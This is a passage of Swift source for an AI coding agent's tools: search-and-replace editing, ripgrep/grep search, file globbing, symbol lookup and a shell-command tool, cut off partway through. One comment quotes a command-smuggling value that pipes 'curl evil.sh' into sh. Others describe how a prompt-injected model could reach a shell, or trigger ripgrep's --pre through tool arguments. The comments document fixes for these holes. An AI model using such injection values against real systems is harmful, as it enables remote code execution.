// SPDX-License-Identifier: AGPL-3.0-only
// Copyright © 2025-2026 Raj Singh
//
//  CodingAssistantTools.swift
//  Devgentic
//
//  Industry-standard coding tools for autonomous LLM coding agents.
//  Implements patterns from modern AI coding assistants (Claude Code, Cursor, etc.)
//

import Foundation
import os

private let logger = DGLogger(category: "CodingAssistantTools")

// MARK: - Edit Code Tool (Search & Replace Blocks)

/// Result of attempting a single edit within content.
enum EditMatchResult: Equatable {
    case applied(newContent: String)
    case notFound
    case ambiguous(occurrences: Int)
}

/// Pure logic for applying a search-and-replace edit to content.
/// Extracted for testability — no file I/O, no logging.
enum EditMatcher {
    static func applyEdit(content: String, oldString: String, newString: String) -> EditMatchResult {
        let occurrences = content.components(separatedBy: oldString).count - 1

        if occurrences == 1 {
            return .applied(newContent: content.replacingOccurrences(of: oldString, with: newString))
        } else if occurrences > 1 {
            return .ambiguous(occurrences: occurrences)
        }

        // Fallback: whitespace-normalized single-line match.
        //
        // This exists so an `old_string` whose indentation or trailing space differs from the
        // file still matches. Two things it must NOT do, both of which it used to:
        //
        // 1. **Take the first of several candidates.** Lines that differ only in indentation
        //    normalize to the same text, so more than one can match. The exact path refuses that
        //    case as `.ambiguous` precisely because which one the caller meant is unknowable —
        //    and the fallback edited whichever came first and reported success, so the model
        //    believed it had changed a location it had not. Same guard, same answer, both paths.
        //
        // 2. **Substitute the whole line verbatim.** Replacing `lines[i]` with `newString` drops
        //    the line's own leading whitespace, so a correctly-written edit lands at column zero.
        //    In Swift that is untidy; in Python, YAML or a Makefile it is a syntax error written
        //    to disk under an "Applied edit" success message. The model cannot avoid it either —
        //    it asked to replace one expression with another and got its indentation removed.
        //    The matched line's indent is re-applied unless `newString` brings its own.
        // `.whitespacesAndNewlines`, not `.whitespaces`.
        //
        // `components(separatedBy: "\n")` splits a Windows-line-ended file correctly — Foundation
        // searches at the scalar level — so each line arrives with a TRAILING `\r`. And
        // `CharacterSet.whitespaces` does not contain `\r`. The result was that on any CRLF file
        // every comparison was `"let x = 1\r" == "let x = 1"`, so this fallback could never fire:
        // a model editing a Windows-authored file got "old_string not found" where the identical
        // edit against an LF file would have matched. Safe, but silently less capable on a whole
        // class of real repositories.
        //
        // The exact-match path above is unaffected — it is a substring replace and never looks at
        // line boundaries.
        let normalizedSearch = oldString.trimmingCharacters(in: .whitespacesAndNewlines)
        let lines = content.components(separatedBy: "\n")

        let matchedIndices = lines.indices.filter {
            lines[$0].trimmingCharacters(in: .whitespacesAndNewlines) == normalizedSearch
        }

        guard matchedIndices.count <= 1 else {
            return .ambiguous(occurrences: matchedIndices.count)
        }
        guard let lineIdx = matchedIndices.first else {
            return .notFound
        }

        // Leading whitespace of the line being replaced. An empty `newString` is a DELETION and
        // must stay empty; a `newString` that already starts with whitespace is taken as
        // deliberately indented and is left alone, so nothing is ever double-indented.
        let indent = String(lines[lineIdx].prefix { $0 == " " || $0 == "\t" })
        var replacement: String
        if newString.isEmpty || newString.hasPrefix(" ") || newString.hasPrefix("\t") {
            replacement = newString
        } else {
            replacement = indent + newString
        }

        // Re-attach the line's own carriage return.
        //
        // After splitting on "\n", a CRLF file's lines each end with `\r`. Writing the
        // replacement without it and rejoining with "\n" would give that ONE line an LF ending
        // while every other line kept CRLF — a file with mixed line endings, produced silently by
        // an edit the caller asked to make to a single expression. Whatever the file's convention
        // is, an edit should not change it.
        if lines[lineIdx].hasSuffix("\r") && !replacement.hasSuffix("\r") {
            replacement += "\r"
        }

        var mutableLines = lines
        mutableLines[lineIdx] = replacement
        return .applied(newContent: mutableLines.joined(separator: "\n"))
    }
}

// MARK: - Search Binary Resolution

/// Which search program the code-search tools run.
///
/// ripgrep is preferred, `/usr/bin/grep` is the fallback, and **which one runs depends on whether
/// the user happens to have ripgrep installed** — so both paths ship, both reach real users, and
/// both have to work. They are not equivalent: different regex dialect (fixed 2026-07-31),
/// different flags, different `-c` output shape.
///
/// The lookup lives here, once, rather than being repeated at each call site — but the reason it
/// is a TYPE rather than a function is `discoveryOverride`. A test machine has exactly one of the
/// two binaries installed, so whichever it is, the other branch is never executed and silently
/// stops being covered. That is not hypothetical: installing ripgrep on 2026-07-31 to make the rg
/// branch reachable in production simultaneously retired the grep fallback from every test, and
/// the counting arguments for grep were written and shipped without ever being run.
enum SearchBinary {

    /// Where ripgrep is normally installed, in preference order.
    static let ripgrepCandidates = ["/opt/homebrew/bin/rg", "/usr/local/bin/rg"]

    /// Always present on macOS.
    static let grep = "/usr/bin/grep"

    enum Override: Sendable {
        /// Behave as though ripgrep is not installed, so the grep fallback runs.
        case ripgrepUnavailable
        /// Use this ripgrep, wherever it is.
        case ripgrepAt(String)
    }

    /// **Test-only.** Nil in production, and never written by app code — the app only reads
    /// `ripgrepPath`. Marked `nonisolated(unsafe)` because it is set once by a test before the
    /// call it affects and never mutated concurrently; the alternative (threading a dependency
    /// through four tools' arguments) would change production signatures to serve a test.
    nonisolated(unsafe) static var discoveryOverride: Override?

    /// The ripgrep to use, or nil when the grep fallback should run.
    static var ripgrepPath: String? {
        switch discoveryOverride {
        case .ripgrepUnavailable:
            return nil
        case .ripgrepAt(let path):
            return path
        case nil:
            return ripgrepCandidates.first { FileManager.default.fileExists(atPath: $0) }
        }
    }
}

// MARK: - Search Match Counting

/// The number of MATCHES a search found, as opposed to the number of lines it printed.
///
/// These are different numbers whenever context is on, and the display output cannot tell them
/// apart: `rg`/`grep` print both as `<path><sep><lineno><sep><text>` and distinguish a match
/// from a neighbour only by a separator character that can itself occur inside a path.
///
/// Counting printed lines instead — which is what `code_search` and the `code_search_*` splits
/// did — reports ONE match as five under the default `context_lines: 2`. That number is what a
/// model reads to decide whether a search was too broad, and `max_results` truncated against
/// the same inflated figure, so a search was cut off at roughly a fifth of the matches the
/// caller asked for while claiming it had exceeded the limit.
///
/// `-c` prints `<path>:<count>` per file with the count as the trailing field, so summing is
/// unambiguous whatever the path contains. It costs a second invocation, which is why callers
/// only reach for it when context is actually on — `code_search_symbol` and `code_search_files`
/// request none and pay nothing.
enum SearchMatchCounter {

    /// Sums the per-file counts, or nil if the counting run could not be completed — callers
    /// fall back to the printed-line figure rather than reporting nothing.
    static func exactMatchCount(executable: String, arguments: [String]) -> Int? {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: executable)
        process.arguments = arguments

        guard let run = try? ProcessRunner.run(process) else { return nil }
        // Exit 1 means "no matches" for both programs and is a legitimate zero, not a failure.
        guard run.exitCode == 0 || run.exitCode == 1 else { return nil }

        var total = 0
        for line in run.standardOutput.split(separator: "\n") {
            guard let trailing = line.split(separator: ":").last, let count = Int(trailing) else { continue }
            total += count
        }
        return total
    }

    /// Argument vector for a counting run, mirroring the display run's filters exactly so the
    /// two answer the same question.
    static func countingArguments(
        useRipgrep: Bool,
        pattern: String,
        path: String,
        glob: String?,
        caseSensitive: Bool,
        wholeWord: Bool
    ) -> [String] {
        var args: [String] = useRipgrep ? ["-c", "--color=never"] : ["-rcE", "--color=never"]
        if !caseSensitive { args.append("-i") }
        if wholeWord { args.append("-w") }
        if let glob { args += useRipgrep ? ["--glob", glob] : ["--include", glob] }
        // `--` for the same reason the display run passes it: a model-supplied pattern must not
        // reach the callee's option parser.
        args += ["--", pattern, path]
        return args
    }
}

// MARK: - Edit Code Tool (continued)

struct EditCodeTool: DevgenticTool {
    let name = "edit_code"
    let category = "Coding Assistant"
    let description = "Applies precise search-and-replace edits to a file. Finds an exact block of code and replaces it with new code. Supports multiple edits in a single call for atomic multi-region changes."

    struct Arguments: Decodable, Sendable {
        let file_path: String
        let edits: [EditBlock]?
        let old_string: String?
        let new_string: String?

        struct EditBlock: Decodable, Sendable {
            let old_string: String
            let new_string: String
        }

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)

            var fp: String? = nil
            for key in ["file_path", "filePath", "path", "file"] {
                if let ck = DynamicKey(stringValue: key),
                   let val = try? container.decode(String.self, forKey: ck) {
                    fp = val
                    break
                }
            }
            self.file_path = try fp ?? container.decode(String.self, forKey: DynamicKey(stringValue: "file_path")!)

            self.edits = try? container.decodeIfPresent([EditBlock].self, forKey: DynamicKey(stringValue: "edits")!)
            self.old_string = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "old_string")!)
            self.new_string = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "new_string")!)
        }
    }

    var parameterSchema: ToolParameters {
        // See `edit_code_batch`: `edits` carries OBJECTS, and `SchemaBuilder.object` declares
        // every array as an array of strings. The item type is what a provider validates the
        // model's call against, so it has to say what the decoder actually accepts.
        var properties = SchemaBuilder.object(
            properties: [
                ("file_path", "string", "Absolute or relative path to the file to edit."),
                ("old_string", "string", "The exact code block to find and replace. Must be unique in the file. Include enough surrounding context lines to ensure uniqueness."),
                ("new_string", "string", "The new code to replace old_string with. Use empty string to delete the matched block.")
            ],
            required: []
        ).properties
        properties["edits"] = ToolParameterProperty(
            type: "array",
            description: "Array of {old_string, new_string} objects for multiple atomic edits in one call. Takes precedence over top-level old_string/new_string.",
            items: ["type": "object"]
        )
        return ToolParameters(type: "object", properties: properties, required: ["file_path"])
    }

    func call(arguments: Arguments) async throws -> String {
        let expandedPath = FilePathResolver.resolve(arguments.file_path)
        let fileURL = URL(fileURLWithPath: expandedPath)

        guard FileManager.default.fileExists(atPath: expandedPath) else {
            return "Error: File not found at '\(expandedPath)'."
        }

        var content: String
        do {
            content = try String(contentsOf: fileURL, encoding: .utf8)
        } catch {
            return "Error reading file: \(error.localizedDescription)"
        }

        // Build edit list from either `edits` array or single old_string/new_string
        var editPairs: [(old: String, new: String)] = []

        if let edits = arguments.edits, !edits.isEmpty {
            editPairs = edits.map { ($0.old_string, $0.new_string) }
        } else if let oldStr = arguments.old_string {
            editPairs = [(oldStr, arguments.new_string ?? "")]
        } else {
            return "Error: Provide either 'edits' array or 'old_string'/'new_string' parameters."
        }

        var appliedCount = 0
        var errors: [String] = []

        for (idx, edit) in editPairs.enumerated() {
            let matchResult = EditMatcher.applyEdit(content: content, oldString: edit.old, newString: edit.new)
            switch matchResult {
            case .applied(let newContent):
                content = newContent
                appliedCount += 1
            case .notFound:
                errors.append("Edit \(idx + 1): old_string not found in file. Ensure the search block is an exact match with sufficient context.")
            case .ambiguous(let occurrences):
                errors.append("Edit \(idx + 1): old_string matches \(occurrences) locations. Include more surrounding context to make it unique.")
            }
        }

        if appliedCount > 0 {
            do {
                try content.write(to: fileURL, atomically: true, encoding: .utf8)
            } catch {
                return "Error writing file: \(error.localizedDescription)"
            }
        }

        var result = "Applied \(appliedCount)/\(editPairs.count) edit(s) to \(arguments.file_path)."
        if !errors.isEmpty {
            result += "\nErrors:\n" + errors.joined(separator: "\n")
        }
        return result
    }
}

// MARK: - Code Search Tool (Structured Ripgrep)

struct CodeSearchTool: DevgenticTool {
    let name = "code_search"
    let category = "Coding Assistant"
    let description = "High-performance regex code search powered by ripgrep. Returns structured results with file paths, line numbers, match context, and match counts. Respects .gitignore boundaries."

    struct Arguments: Decodable, Sendable {
        let pattern: String
        let path: String?
        let glob: String?
        let context_lines: Int?
        let max_results: Int?
        let case_sensitive: Bool?
        let whole_word: Bool?
        let files_only: Bool?

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)
            self.pattern = try container.decode(String.self, forKey: DynamicKey(stringValue: "pattern")!)
            self.path = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "path")!)
            self.glob = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "glob")!)
            self.context_lines = try? container.decodeIfPresent(Int.self, forKey: DynamicKey(stringValue: "context_lines")!)
            self.max_results = try? container.decodeIfPresent(Int.self, forKey: DynamicKey(stringValue: "max_results")!)
            self.case_sensitive = try? container.decodeIfPresent(Bool.self, forKey: DynamicKey(stringValue: "case_sensitive")!)
            self.whole_word = try? container.decodeIfPresent(Bool.self, forKey: DynamicKey(stringValue: "whole_word")!)
            self.files_only = try? container.decodeIfPresent(Bool.self, forKey: DynamicKey(stringValue: "files_only")!)
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("pattern", "string", "Regex or literal string pattern to search for (e.g. 'function\\s+\\w+', 'TODO', 'import.*React')."),
                ("path", "string", "Directory or file path to search within. Required — pass the project root or a specific subpath."),
                ("glob", "string", "File pattern filter (e.g. '*.swift', '*.ts', '!*.test.js'). Narrows search scope."),
                ("context_lines", "integer", "Number of context lines before and after each match (default 2, max 10)."),
                ("max_results", "integer", "Maximum number of matches to return (default 50). Prevents context overflow."),
                ("case_sensitive", "boolean", "Whether search is case-sensitive (default true)."),
                ("whole_word", "boolean", "Match whole words only (default false)."),
                ("files_only", "boolean", "Return only matching file paths without line content (default false).")
            ],
            required: ["pattern", "path"]
        )
    }

    func call(arguments: Arguments) async throws -> String {
        guard let rawPath = arguments.path, !rawPath.isEmpty else {
            return "Error: 'path' is required. Pass the project root or a specific subpath."
        }
        let resolvedPath = FilePathResolver.resolve(rawPath)
        guard FileManager.default.fileExists(atPath: resolvedPath) else {
            return "Error: path '\(resolvedPath)' does not exist."
        }

        var args: [String] = ["-n", "--no-heading", "--color=never"]

        let contextLines = min(arguments.context_lines ?? 2, 10)
        if !((arguments.files_only ?? false)) {
            args += ["-C", String(contextLines)]
        }

        let maxResults = arguments.max_results ?? 50

        if !(arguments.case_sensitive ?? true) {
            args.append("-i")
        }
        if arguments.whole_word ?? false {
            args.append("-w")
        }
        if arguments.files_only ?? false {
            args.append("-l")
        }
        if let glob = arguments.glob {
            args += ["--glob", glob]
        }

        // `--` ends option parsing. Without it a `pattern` beginning with `-` is read by the
        // SEARCH PROGRAM as one of its own flags, which argv does nothing to prevent — argv
        // stops the shell, not the callee's parser. Confirmed against /usr/bin/grep: a pattern
        // of `-f <path>` made grep read that file as its pattern LIST, and ripgrep's `--pre`
        // names a preprocessor COMMAND it executes, so on any machine with ripgrep installed
        // the same hole is arbitrary code execution rather than an arbitrary read.
        args.append("--")
        args.append(arguments.pattern)
        args.append(resolvedPath)

        // Check if rg (ripgrep) is available, fallback to grep
        let rgPath = SearchBinary.ripgrepPath

        let process = Process()

        if let rgPath = rgPath {
            process.executableURL = URL(fileURLWithPath: rgPath)
            process.arguments = args
        } else {
            // Fallback to grep. `-E` — EXTENDED regex, matching the dialect ripgrep speaks.
            //
            // Which branch runs depends on whether ripgrep happens to be installed on the
            // user's machine, so the two must agree about what a pattern MEANS. grep's default
            // is BASIC regex, where `+ ? | ( )` are literals and `\(` opens a group — the exact
            // inversion of ripgrep's — so the same search silently found matches on one machine
            // and reported "No matches found" on another, with no error on either. A false
            // absence is worse than a failure: the agent believes the codebase, not the tool.
            var grepArgs = ["-rnE", "--color=never"]
            if !(arguments.case_sensitive ?? true) { grepArgs.append("-i") }
            if arguments.whole_word ?? false { grepArgs.append("-w") }
            if arguments.files_only ?? false { grepArgs.append("-l") }
            if let glob = arguments.glob {
                grepArgs += ["--include", glob]
            }
            grepArgs.append("--")            // as above — the fallback needs it just as much
            grepArgs.append(arguments.pattern)
            grepArgs.append(resolvedPath)
            process.executableURL = URL(fileURLWithPath: "/usr/bin/grep")
            process.arguments = grepArgs
        }

        // grep / ripgrep write one "Permission denied" line per unreadable directory to
        // STDERR, and this site attached stderr to a pipe it never read — over a home
        // directory that passes 64 KB easily and the search hangs forever.
        let rawOutput: String
        do {
            rawOutput = try ProcessRunner.run(process).standardOutput
        } catch {
            return "Error running search: \(error.localizedDescription)"
        }

        if rawOutput.isEmpty {
            return "No matches found for '\(arguments.pattern)'."
        }

        // `max_results` bounds the number of PRINTED lines. With context on, one match can print
        // up to 2N+1 of them, so this is a bound on output volume — which is what it is for
        // ("Prevents context overflow") — and NOT a count of matches. The two were conflated.
        let filesOnly = arguments.files_only ?? false
        let lines = rawOutput.components(separatedBy: "\n")
        var shownLines = 0
        var truncatedLines: [String] = []
        var truncated = false

        for line in lines {
            if !line.isEmpty && !line.hasPrefix("--") { shownLines += 1 }
            if shownLines > maxResults {
                truncated = true
                break
            }
            truncatedLines.append(line)
        }

        // The real figure. Only worth a second invocation when context is on, because that is
        // the only case where printed lines and matches differ: `files_only` prints one line per
        // file and a zero-context search prints one line per match, both already exact.
        let contextInflatesTheCount = !filesOnly && contextLines > 0
        let exactMatches: Int? = contextInflatesTheCount
            ? SearchMatchCounter.exactMatchCount(
                executable: rgPath ?? "/usr/bin/grep",
                arguments: SearchMatchCounter.countingArguments(
                    useRipgrep: rgPath != nil,
                    pattern: arguments.pattern,
                    path: resolvedPath,
                    glob: arguments.glob,
                    caseSensitive: arguments.case_sensitive ?? true,
                    wholeWord: arguments.whole_word ?? false))
            : nil
        let reportedCount = exactMatches ?? shownLines

        var result = truncatedLines.joined(separator: "\n")
        if truncated {
            result += "\n\n[Truncated: output exceeded \(maxResults) lines"
            if let exactMatches { result += " (\(exactMatches) match\(exactMatches == 1 ? "" : "es") total)" }
            result += ". Refine your pattern or glob, or lower context_lines, to narrow results.]"
        }

        // Cap total output size
        let maxOutput = 8000
        if result.count > maxOutput {
            result = String(result.prefix(maxOutput)) + "\n...[Output truncated at \(maxOutput) chars]"
        }

        let noun = filesOnly ? "file" : "match"
        return "\(result)\n(\(reportedCount) \(Self.pluralise(noun, count: reportedCount)))"
    }

    /// "1 match" / "2 matches" / "1 file" / "2 files".
    ///
    /// The previous form appended "es" unconditionally, which is right for "match" and produces
    /// "filees" for the `files_only` path — the one the `code_search_files` split always takes.
    static func pluralise(_ noun: String, count: Int) -> String {
        guard count != 1 else { return noun }
        return noun.hasSuffix("h") || noun.hasSuffix("s") || noun.hasSuffix("x") ? noun + "es" : noun + "s"
    }
}

// MARK: - Glob Files Tool (File Pattern Matching)

struct GlobFilesTool: DevgenticTool {
    let name = "glob_files"
    let category = "File System"
    let description = "Finds files matching glob patterns (e.g. '**/*.swift', 'src/**/*.ts'). Fast file discovery for navigating codebases."

    struct Arguments: Decodable, Sendable {
        let pattern: String
        let path: String?
        let max_results: Int?

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)
            self.pattern = try container.decode(String.self, forKey: DynamicKey(stringValue: "pattern")!)
            self.path = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "path")!)
            self.max_results = try? container.decodeIfPresent(Int.self, forKey: DynamicKey(stringValue: "max_results")!)
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("pattern", "string", "Glob pattern to match files (e.g. '**/*.swift', 'src/**/*.ts', '*.json', 'Tests/**/*Test.swift')."),
                ("path", "string", "Root directory to search from. Required — pass the project root or a specific subpath."),
                ("max_results", "integer", "Maximum files to return (default 100).")
            ],
            required: ["pattern", "path"]
        )
    }

    func call(arguments: Arguments) async throws -> String {
        guard let rawPath = arguments.path, !rawPath.isEmpty else {
            return "Error: 'path' is required. Pass the project root or a specific subpath."
        }
        let basePath = FilePathResolver.resolve(rawPath)
        guard FileManager.default.fileExists(atPath: basePath) else {
            return "Error: path '\(basePath)' does not exist."
        }
        let maxResults = arguments.max_results ?? 100

        // `find` is invoked DIRECTLY, never through a shell.
        //
        // This used to build a `zsh -c` string with the caller's pattern interpolated inside
        // double quotes: `-name "\(pattern)"`. A pattern containing a double quote closes that
        // quote and everything after it is shell syntax, so
        //     a" ; curl evil.sh | sh ; echo "
        // ran as its own command. `pattern` and `path` are tool ARGUMENTS — they come from the
        // model, which means anything that can influence the model (a web page, a file it was
        // asked to read, a poisoned dependency) could reach a shell through this tool. It is
        // enabled on profiles that deliberately withhold shell access.
        //
        // The fix is structural, not more quoting: with `execve` argv, a pattern is one
        // argument no matter what characters it contains, and there is no parser to escape
        // from. Escaping is a thing you can get subtly wrong forever; argv is a thing you
        // cannot.
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/find")

        let pattern = arguments.pattern
        // Heavy directories are PRUNED rather than filtered after the fact. `! -path` still
        // descends into `node_modules` and discards the results; `-prune` never enters it. That
        // more than pays back the `| head -N` this no longer uses — the pipeline used to make
        // `find` die of SIGPIPE once enough lines had been printed, and the limit is now
        // applied in Swift instead, below.
        var pruneNames = ["-name", ".git", "-o", "-name", "node_modules"]
        let matchPredicate: [String]

        if pattern.contains("**") {
            pruneNames += ["-o", "-name", ".build", "-o", "-name", "DerivedData"]
            matchPredicate = ["-name", pattern.replacingOccurrences(of: "**/", with: "")]
        } else if pattern.contains("/") {
            // Path-shaped patterns keep the narrower prune set they have always had; widening
            // it here would silently change which files this tool finds, which is not what an
            // injection fix is for.
            matchPredicate = ["-path", "*/\(pattern)"]
        } else {
            pruneNames += ["-o", "-name", ".build", "-o", "-name", "DerivedData"]
            matchPredicate = ["-name", pattern]
        }

        // `(` and `)` are literal arguments to `find`, not shell grouping — there is no shell
        // here to interpret them, which is the whole point.
        process.arguments = [basePath, "-type", "d", "("] + pruneNames + [")", "-prune", "-o", "-type", "f"]
            + matchPredicate + ["-print"]

        let output: String
        do {
            // stderr is deliberately ignored rather than suppressed with `2>/dev/null`:
            // `find` reports unreadable directories there and exits non-zero, which is not a
            // failure of the search. ProcessRunner keeps the streams apart, so ignoring it
            // needs no shell redirection.
            output = try ProcessRunner.run(process).standardOutput
                .trimmingCharacters(in: .whitespacesAndNewlines)
        } catch {
            return "Error: \(error.localizedDescription)"
        }

        if output.isEmpty {
            return "No files found matching '\(arguments.pattern)' in \(basePath)."
        }

        // `head -\(maxResults)` used to do this in the pipeline. Applied here instead, and the
        // count reported is the number that MATCHED rather than the number shown — the old
        // form could only infer truncation from `count >= maxResults`, which is also what an
        // exact-fit result looks like.
        let matched = output.components(separatedBy: "\n").filter { !$0.isEmpty }
        let files = Array(matched.prefix(maxResults))

        var result = "Found \(matched.count) file(s) matching '\(arguments.pattern)':\n"
        result += files.joined(separator: "\n")

        if matched.count > maxResults {
            result += "\n\n[Showing \(maxResults) of \(matched.count). Refine your pattern to narrow results.]"
        }

        return result
    }
}

// MARK: - Find Definition Tool (Symbol Search)

struct FindDefinitionTool: DevgenticTool {
    let name = "find_definition"
    let category = "Coding Assistant"
    let description = "Finds where symbols (functions, classes, structs, protocols, variables) are defined across the codebase. Searches for declaration patterns in common languages."

    struct Arguments: Decodable, Sendable {
        let symbol: String
        let language: String?
        let path: String?

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)
            self.symbol = try container.decode(String.self, forKey: DynamicKey(stringValue: "symbol")!)
            self.language = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "language")!)
            self.path = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "path")!)
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("symbol", "string", "The symbol name to find the definition of (function, class, struct, protocol, variable name)."),
                ("language", "string", "Programming language hint: 'swift', 'python', 'typescript', 'javascript', 'rust', 'go', 'java', 'ruby', 'cpp'. Auto-detected if omitted."),
                ("path", "string", "Directory to search in. Required — pass the project root or a specific subpath.")
            ],
            required: ["symbol", "path"]
        )
    }

    func call(arguments: Arguments) async throws -> String {
        guard let rawPath = arguments.path, !rawPath.isEmpty else {
            return "Error: 'path' is required. Pass the project root or a specific subpath."
        }
        let basePath = FilePathResolver.resolve(rawPath)
        guard FileManager.default.fileExists(atPath: basePath) else {
            return "Error: path '\(basePath)' does not exist."
        }
        let symbol = arguments.symbol

        // Build language-specific definition patterns
        let patterns: [(pattern: String, glob: String)]

        switch arguments.language?.lowercased() {
        case "swift":
            patterns = [
                ("(func|class|struct|enum|protocol|actor|typealias|let|var)\\s+\(symbol)", "*.swift")
            ]
        case "python":
            patterns = [
                ("(def|class|async def)\\s+\(symbol)", "*.py")
            ]
        case "typescript", "javascript", "ts", "js":
            patterns = [
                ("(function|class|const|let|var|interface|type|enum|export\\s+(default\\s+)?(function|class|const|let|var|interface|type))\\s+\(symbol)", "*.{ts,tsx,js,jsx}")
            ]
        case "rust":
            patterns = [
                ("(fn|struct|enum|trait|type|const|static|mod|impl)\\s+\(symbol)", "*.rs")
            ]
        case "go":
            patterns = [
                ("(func|type|var|const)\\s+\(symbol)", "*.go")
            ]
        case "java":
            patterns = [
                ("(class|interface|enum|@interface|void|public|private|protected|static).*\\s+\(symbol)", "*.java")
            ]
        case "ruby":
            patterns = [
                ("(def|class|module)\\s+\(symbol)", "*.rb")
            ]
        case "cpp", "c++", "c":
            patterns = [
                ("(class|struct|enum|typedef|void|int|bool|auto|namespace).*\\s+\(symbol)", "*.{cpp,hpp,c,h,cc,hh}")
            ]
        default:
            // Multi-language search
            patterns = [
                ("(func|def|class|struct|enum|protocol|trait|interface|type|const|let|var|function|module|actor|typealias|async def)\\s+\(symbol)", "*")
            ]
        }

        var allResults: [String] = []

        for (pattern, glob) in patterns {
            let rgPath = SearchBinary.ripgrepPath

            let process = Process()

            if let rgPath = rgPath {
                process.executableURL = URL(fileURLWithPath: rgPath)
                var args = ["-n", "--no-heading", "--color=never", "-B", "1", "-A", "5"]
                if glob != "*" {
                    args += ["--glob", glob]
                }
                // `--` ends option parsing — the pattern is built from a model-supplied
                // `symbol`, and without it a leading `-` reaches ripgrep's own parser (`--pre`
                // names a command it runs). See the note in `code_search`.
                args += ["--", pattern, basePath]
                process.arguments = args
            } else {
                process.executableURL = URL(fileURLWithPath: "/usr/bin/grep")
                // `-E` folded into the seed rather than appended later. It was always passed
                // here, but stating it beside the other flags is what lets a source scan verify
                // every grep fallback in the tree requests the same dialect — see the note in
                // `code_search`.
                var args = ["-rnE", "--color=never", "-A", "5"]
                if glob != "*" {
                    args += ["--include", glob]
                }
                args += ["--", pattern, basePath]
                process.arguments = args
            }

            do {
                // ProcessRunner drains stdout AND stderr concurrently; this site read the pipe
                // only after waitUntilExit(), which hangs once output passes the ~64 KB buffer.
                let data = Data(try ProcessRunner.run(process).standardOutput.utf8)
                if let output = String(data: data, encoding: .utf8), !output.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
                    allResults.append(output.trimmingCharacters(in: .whitespacesAndNewlines))
                }
            } catch {
                continue
            }
        }

        if allResults.isEmpty {
            return "No definition found for '\(symbol)'\(arguments.language != nil ? " in \(arguments.language!) files" : "")."
        }

        var result = allResults.joined(separator: "\n---\n")

        let maxOutput = 8000
        if result.count > maxOutput {
            result = String(result.prefix(maxOutput)) + "\n...[Truncated at \(maxOutput) chars]"
        }

        return "Definitions for '\(symbol)':\n\(result)"
    }
}

// MARK: - Batch Command Tool (Multi-Step Shell Execution)

struct BatchCommandTool: DevgenticTool {
    let name = "batch_command"
    let category = "Coding Assistant"
    let description = "Executes a shell command with advanced options: configurable timeout, background execution, and working directory. Output is returned in full; if it is larger than the room left in the model's context, the middle is omitted (start and end kept) with a note saying so."

    /// Scopes background tasks to the conversation that started them, so `bg_1` means one thing
    /// per conversation and one conversation cannot poll or stop another's build.
    ///
    /// ⚠️ Optional because the catalogue builds every tool once with `nil` for Library metadata
    /// (`NativeToolEntry.make` probes a instance for its name and category). A nil id means there
    /// is nothing to register a background task AGAINST — see the refusal in `call`, which is
    /// deliberately a refusal rather than a launch, because an unregistered background process is
    /// exactly the orphan this work exists to remove.
    let conversationID: UUID?

    init(conversationID: UUID? = nil) {
        self.conversationID = conversationID
    }

    struct Arguments: Decodable, Sendable {
        let command: String
        let working_directory: String?
        let timeout_seconds: Int?
        let background: Bool?
        let task_name: String?

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)

            var cmd: String? = nil
            for key in ["command", "cmd", "script"] {
                if let ck = DynamicKey(stringValue: key),
                   let val = try? container.decode(String.self, forKey: ck) {
                    cmd = val
                    break
                }
            }
            self.command = try cmd ?? container.decode(String.self, forKey: DynamicKey(stringValue: "command")!)

            self.working_directory = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "working_directory")!)
            self.timeout_seconds = try? container.decodeIfPresent(Int.self, forKey: DynamicKey(stringValue: "timeout_seconds")!)
            self.background = try? container.decodeIfPresent(Bool.self, forKey: DynamicKey(stringValue: "background")!)
            self.task_name = try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "task_name")!)
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("command", "string", "The shell command to execute."),
                ("working_directory", "string", "Working directory for command execution. Required — pass the project root or a specific subpath."),
                ("timeout_seconds", "integer", "Maximum execution time in seconds, max 900. Defaults to 30 in the foreground and 900 in the background. The process is killed on timeout, but any output it produced first is still returned."),
                // ⚠️ The model chooses the mode, and it was choosing blind: this said only "run in
                // background and return immediately", with nothing about WHEN that is right. A
                // device run on 2026-09-21 backgrounded a build whose result it wanted one second
                // later, then spent 9 iterations polling for it. The correct answer was a
                // foreground call with a raised timeout, and nothing told it so.
                //
                // Worth the ~250 extra chars in every request: it is read at the moment of the
                // decision, which a system-prompt paragraph is not.
